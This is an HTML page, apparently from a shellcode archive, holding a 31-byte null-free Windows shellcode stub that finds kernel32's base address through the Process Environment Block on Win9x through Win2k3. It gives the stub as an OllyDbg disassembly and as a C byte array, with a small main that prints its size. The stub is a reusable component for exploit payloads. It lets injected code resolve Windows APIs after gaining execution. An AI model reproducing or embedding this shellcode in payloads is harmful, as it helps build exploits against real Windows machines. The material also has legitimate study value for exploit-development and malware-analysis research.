<html><head><title>Windows - PEB method (9x/NT/2k/XP) - 31 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
004045F4 &gt; 6A 30            PUSH 30
004045F6   59               POP ECX
004045F7   64:8B09          MOV ECX,DWORD PTR FS:[ECX]
004045FA   85C9             TEST ECX,ECX
004045FC   78 0C            JS SHORT OllyTest.0040460A
004045FE   8B49 0C          MOV ECX,DWORD PTR DS:[ECX+C]
00404601   8B71 1C          MOV ESI,DWORD PTR DS:[ECX+1C]
00404604   AD               LODS DWORD PTR DS:[ESI]
00404605   8B48 08          MOV ECX,DWORD PTR DS:[EAX+8]
00404608   EB 09            JMP SHORT OllyTest.00404613
0040460A   8B49 34          MOV ECX,DWORD PTR DS:[ECX+34]
0040460D   8B49 7C          MOV ECX,DWORD PTR DS:[ECX+7C]
00404610   8B49 3C          MOV ECX,DWORD PTR DS:[ECX+3C]
*/

/*
31 byte C PEB kernel base location method works on win9x-win2k3
no null bytes, so no need to xor.

-twoci
*/

unsigned char PEBCode[] =
{&quot;\x6A\x30&quot;
&quot;\x59&quot;
&quot;\x64\x8B\x09&quot;
&quot;\x85\xC9&quot;
&quot;\x78\x0C&quot;
&quot;\x8B\x49\x0C&quot;
&quot;\x8B\x71\x1C&quot;
&quot;\xAD&quot;
&quot;\x8B\x48\x08&quot;
&quot;\xEB\x09&quot;
&quot;\x8B\x49\x34&quot;
&quot;\x8B\x49\x7C&quot;
&quot;\x8B\x49\x3C&quot;};

int main( int argc, char *argv[] )
{
   printf( &quot;sizeof(PEBCode) = %u\n&quot;, sizeof(PEBCode) );
   return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
